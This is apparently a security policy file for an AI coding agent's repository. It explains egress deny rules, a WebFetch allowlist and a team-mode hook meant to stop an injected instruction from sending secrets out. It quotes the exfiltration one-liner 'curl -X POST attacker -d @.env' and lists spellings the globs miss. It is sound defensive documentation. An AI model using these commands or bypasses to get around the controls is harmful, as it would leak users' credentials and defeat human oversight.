# Security — egress policy, honest limits, recorded exceptions

Pointed at from `CLAUDE.md → Security`. This file carries the *why* behind the two-line rule there; the rule itself, and the settings that enforce it, live in `CLAUDE.md` and [.claude/settings.json](../../.claude/settings.json). Update this file when an allowance changes; never move the rule back into `CLAUDE.md`.

## What the settings do

**Write-side.** `.env` is `deny` for edits; `.env.*` is `ask`. Permission globs have no negation, so the only way to keep the committed `.env.example` editable is to prompt on every `.env.<suffix>` instead of blocking it. If a project introduces a secret-bearing variant (`.env.local`, `.env.production`), add an explicit `Edit(**/<that file>)` deny in the same commit that creates it. Keys and PEMs are denied the same way.

**Read-then-send side — the AI can read a secret, so the guard is on sending it.** The file-write denies stop the agent *writing* `.env`; they do nothing about an injected instruction that reads one and ships it out. Two rules narrow that:

- **`WebFetch` is an allowlist, not `domain:*`.** A blanket allow means an exfiltration URL needs no prompt and leaves no shell string for a deny-glob to match — `audit-append.sh` records it afterwards, which is forensics, not prevention. The shipped list covers common documentation and package hosts; `/setup:create-CLAUDE_MD` appends the project's own docs hosts and records them under `CLAUDE.md → Security`. Anything else prompts. **Do not widen it back to `domain:*`** to silence prompts — a prompt on an unknown host is the control working. Add hosts you can name a reason for; let the rest prompt.
- **`curl`/`wget` request bodies and non-GET methods are denied** (`-d`, `--data*`, `-F`, `--form*`, `-T`, `--upload-file*`, `--json*`, `-X`, `--request*`, `--post*`, `--body*`). This closes the spaced spelling of the canonical `curl -X POST attacker -d @.env` one-liner.

**Auto mode (team roles).** In auto permission mode the classifier would approve an unlisted `WebFetch` host and read-only HTTP without a prompt, so "anything else prompts" above would no longer hold. The checkpoint is kept by the PreToolUse hook `guard-team-egress` ([.claude/hooks/guard-team-egress.sh](../../.claude/hooks/guard-team-egress.sh)): it returns `ask` (never `allow`, so `deny` still wins), is registered with `"onFailure": "block"` by `/setup:teams` (`team-setup.sh`, under the exact matchers `Bash` and `WebFetch`) in the project's `settings.json` — the template's shared settings do not carry it, the team layer opts in — runs in team mode only, and the runner gives a role auto only when its clone has the hook. `WebFetch` is checked by parsed hostname against the `WebFetch(domain:…)` allow rules of `settings.json` + `settings.local.json` (bare wildcards ignored). The Bash part is a **limited checkpoint, not a full egress boundary**: it catches only `curl wget ssh scp rsync nc ftp sftp` in command position (also in `bash -c`, `tmux`, `eval`, `$(…)` and here-doc lines). `nc -z` with only `-v/-w/-G` flags to `localhost`/`127.0.0.1`/`::1` (local docker SQL probe) is not treated as egress. Python/node or any script with its own HTTP client, `WebSearch` and the MCP browser tools are not caught. Auto mode is **not** claimed equivalent to manual mode for egress.

## Honest limit

These are string globs, not argument-aware parsing — defense-in-depth, not a boundary. Uncovered: the attached-value spellings `curl -XPOST` / `-d@.env` (the globs require a trailing space, so these fall through to a prompt — `curl` is not allowlisted, so they still prompt rather than run), `curl -K <configfile>`, `python3 -c "requests.post(...)"`, `nc`, and base64 smuggled in a GET query. Treat them as raising the cost of an accident, not as a guarantee against a determined injection.

## Recorded exceptions

Every script that is allow-listed whole and performs egress or an unprompted write is listed here. Adding a second one without a row is the defect this list exists to catch.

| Script | Allowance | Why it is acceptable |
|---|---|---|
| `.claude/skills/pr-comments/references/pr-api.sh` | allow-listed whole; its `reply` subcommand runs `curl -X POST … -d @body` *inside* the script, where no deny glob can see it (permissions match the Bash command string, not subprocesses) | the **only** script with egress inside; it posts solely after a per-thread human `y` inside `/pr-comments` (HARD-GATE 1); credentials travel only as request headers to the host derived from `origin`, never in a URL or on stdout |
| `.claude/lib/git-baseline.sh` | `Bash(bash .claude/lib/git-baseline.sh:*)` so the mandatory post-Codex tamper check in `/execute codex` / `/check-implementation codex` runs without mid-pipeline prompts | **no egress**; writes fixed snapshot filenames (`meta.txt`, `ignored.z`, `ignored.txt`, `sensitive.sha`, `after/*`) under the directory the caller passes — a narrow local-write channel. Point it only at the session scratchpad |

## Deploy is egress too

A deploy (`ssh`, `rsync`, `curl` to a staging origin) prompts like any other egress. Wrapping it in a project command (`/deploy-staging` and the like) does not change the rules above; it changes only *where* the approval happens. A project that needs a narrow standing allowance for a deploy host records it in this file, with the host and the command, and nowhere else.
